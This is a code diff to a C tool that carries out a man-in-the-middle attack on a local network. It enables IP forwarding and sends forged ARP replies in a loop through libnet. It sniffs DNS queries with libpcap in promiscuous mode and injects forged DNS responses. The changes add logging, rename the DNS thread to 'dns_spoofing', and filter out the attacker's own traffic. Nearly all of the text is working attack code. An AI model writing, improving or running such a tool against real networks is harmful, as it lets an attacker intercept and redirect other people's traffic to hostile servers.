@@ -13,8 +13,6 @@
 #include <sys/types.h>
 #include <unistd.h>
 
-#define TOS_MARK 0x10
-
 struct reqhdr {
   struct nlmsghdr nl;
   struct rtmsg rt;
@@ -35,7 +33,39 @@ int if_index(char *if_name) {
     return -1;
   }
   close(sfd);
+  printf("[*] Interface %s has index %d\n", if_name, ifr.ifr_ifindex);
   return ifr.ifr_ifindex;
+}
+
+char *ip_addr(char *if_name) {
+  int sfd = socket(PF_INET, SOCK_DGRAM, 0);
+  if (sfd < 0) {
+    perror("socket");
+    return NULL;
+  }
+  struct ifreq ifr;
+  memset(&ifr, 0, sizeof(struct ifreq));
+  strncpy(ifr.ifr_name, if_name, IFNAMSIZ - 1);
+  if (ioctl(sfd, SIOCGIFINDEX, &ifr) < 0) {
+    perror("ioctl");
+    close(sfd);
+    return NULL;
+  }
+  if (ioctl(sfd, SIOCGIFADDR, &ifr) < 0) {
+    perror("ioctl");
+    close(sfd);
+    return NULL;
+  }
+  struct sockaddr_in *addr = (struct sockaddr_in *)&ifr.ifr_addr;
+  char ip_str[INET_ADDRSTRLEN];
+  if (inet_ntop(AF_INET, &addr->sin_addr, ip_str, sizeof(ip_str)) == NULL) {
+    perror("inet_ntop");
+    close(sfd);
+    return NULL;
+  }
+  close(sfd);
+  printf("[*] IP address of interface %s is %s\n", if_name, ip_str);
+  return strdup(ip_str);
 }
 
 char *gateway_ip_addr(int if_index) {
@@ -101,6 +131,8 @@ char *gateway_ip_addr(int if_index) {
     }
     if (strlen(dst) == 0 && atoi(dev) == if_index) {
       close(sfd);
+      printf("[*] Gateway IP address for interface index %d is %s\n", if_index,
+             gwy);
       return strdup(gwy);
     }
   }
@@ -122,6 +154,7 @@ int ip_forwarding() {
     perror("fclose");
     return -1;
   }
+  printf("[*] IP forwarding enabled\n");
   return 0;
 }
 
@@ -169,6 +202,7 @@ void *arp_spoofing(void *args) {
             libnet_geterror(ln));
     return NULL;
   }
+  printf("[*] ARP spoofing started on interface %s\n", interface);
   while (1) {
     err = libnet_write(ln);
     if (err == -1) {
@@ -181,30 +215,12 @@ void *arp_spoofing(void *args) {
   return 0;
 }
 
-uint32_t ip_addr(char *interface) {
-  int sfd = socket(PF_INET, SOCK_DGRAM, 0);
-  if (sfd < 0) {
-    perror("socket");
-    return -1;
-  }
-  struct ifreq ifr;
-  memset(&ifr, 0, sizeof(struct ifreq));
-  strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);
-  if (ioctl(sfd, SIOCGIFADDR, &ifr) < 0) {
-    perror("ioctl");
-    close(sfd);
-    return -1;
-  }
-  close(sfd);
-  return ((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr.s_addr;
-}
-
-char *errbuf;
-pcap_t *handle;
+char *errbuf_pcap;
+pcap_t *pcap_handle;
 
 void cleanup() {
-  pcap_close(handle);
-  free(errbuf);
+  pcap_close(pcap_handle);
+  free(errbuf_pcap);
 }
 
 libnet_t *l;
@@ -257,8 +273,8 @@ void trap(u_char *user, const struct pcap_pkthdr *pkthdr,
 
   printf("[*] DNS response received from local DNS server.\n");
   libnet_clear_packet(l);
-  libnet_build_udp(53, ntohs(udp->uh_sport), LIBNET_UDP_H + size, 0, buffer, size, l,
-                   0);
+  libnet_build_udp(53, ntohs(udp->uh_sport), LIBNET_UDP_H + size, 0, buffer,
+                   size, l, 0);
 
   libnet_build_ipv4(LIBNET_IPV4_H + LIBNET_UDP_H + size, 0,
                     libnet_get_prand(LIBNET_PRu16), 0, 64, IPPROTO_UDP, 0,
@@ -273,33 +289,40 @@ void trap(u_char *user, const struct pcap_pkthdr *pkthdr,
   close(sockfd);
 }
 
-void *dns_forward(void *interface) {
+void *dns_spoofing(void *interface) {
   l = libnet_init(LIBNET_RAW4, interface, errbuf_libnet);
   char *if_char = (char *)interface;
   bpf_u_int32 netp, maskp;
   struct bpf_program fp;
-  errbuf = malloc(PCAP_ERRBUF_SIZE);
-  handle = pcap_create(if_char, errbuf);
-  pcap_set_promisc(handle, 1);
-  pcap_set_snaplen(handle, 65535);
-  pcap_set_timeout(handle, 1000);
-  pcap_activate(handle);
-  pcap_lookupnet(if_char, &netp, &maskp, errbuf);
-  char *filter = "ip and udp and dst port 53";
-  if (pcap_compile(handle, &fp, filter, 0, maskp) < 0) {
-    pcap_perror(handle, "pcap_compile()");
+  errbuf_pcap = malloc(PCAP_ERRBUF_SIZE);
+  pcap_handle = pcap_create(if_char, errbuf_pcap);
+  pcap_set_promisc(pcap_handle, 1);
+  pcap_set_snaplen(pcap_handle, 65535);
+  pcap_set_timeout(pcap_handle, 1000);
+  pcap_activate(pcap_handle);
+  pcap_lookupnet(if_char, &netp, &maskp, errbuf_pcap);
+  char *ip_str = ip_addr(interface);
+  char *filter = malloc(256);
+  int err =
+      sprintf(filter, "ip and udp and dst port 53 and not src host %s", ip_str);
+  if (err < 0) {
+    fprintf(stderr, "Error creating filter string\n");
     exit(EXIT_FAILURE);
   }
-  if (pcap_setfilter(handle, &fp) < 0) {
-    pcap_perror(handle, "pcap_setfilter()");
+  if (pcap_compile(pcap_handle, &fp, filter, 0, maskp) < 0) {
+    pcap_perror(pcap_handle, "pcap_compile()");
     exit(EXIT_FAILURE);
   }
-  if (pcap_setfilter(handle, &fp) < 0) {
-    pcap_perror(handle, "pcap_setfilter()");
+  if (pcap_setfilter(pcap_handle, &fp) < 0) {
+    pcap_perror(pcap_handle, "pcap_setfilter()");
     exit(EXIT_FAILURE);
   }
-  if (pcap_loop(handle, -1, trap, NULL) < 0) {
-    pcap_perror(handle, "pcap_loop()");
+  if (pcap_setfilter(pcap_handle, &fp) < 0) {
+    pcap_perror(pcap_handle, "pcap_setfilter()");
+    exit(EXIT_FAILURE);
+  }
+  if (pcap_loop(pcap_handle, -1, trap, NULL) < 0) {
+    pcap_perror(pcap_handle, "pcap_loop()");
     exit(EXIT_FAILURE);
   }
   return NULL;
@@ -321,13 +344,11 @@ int main(int argc, char **argv) {
     fprintf(stderr, "Error getting gateway IP address\n");
     return EXIT_FAILURE;
   }
-  printf("Gateway IP address: %s\n", gateway);
   if (ip_forwarding() < 0) {
     fprintf(stderr, "Error enabling IP forwarding\n");
     free(gateway);
     return EXIT_FAILURE;
   }
-  printf("IP forwarding enabled\n");
   pthread_t arp_thread, dns_thread;
   struct arp_spoofing_args args;
   args.interface = interface;
@@ -337,7 +358,7 @@ int main(int argc, char **argv) {
     free(gateway);
     return EXIT_FAILURE;
   }
-  if (pthread_create(&dns_thread, NULL, dns_forward, (void *)interface) != 0) {
+  if (pthread_create(&dns_thread, NULL, dns_spoofing, (void *)interface) != 0) {
     fprintf(stderr, "Error creating DNS spoofing thread\n");
     free(gateway);
     return EXIT_FAILURE;
